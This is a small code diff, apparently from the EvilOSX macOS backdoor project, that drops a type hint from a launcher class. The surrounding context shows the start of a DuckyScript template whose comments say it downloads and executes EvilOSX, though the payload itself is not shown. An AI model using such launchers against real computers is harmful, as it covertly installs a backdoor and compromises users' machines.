@@ -7,7 +7,7 @@ from textwrap import dedent
 
 
 class Launcher(LauncherABC):
-    def generate(self, stager: str) -> tuple:
+    def generate(self, stager):
         return ("txt", dedent("""\
         REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
         REM Also see https://ducktoolkit.com/vidpid/
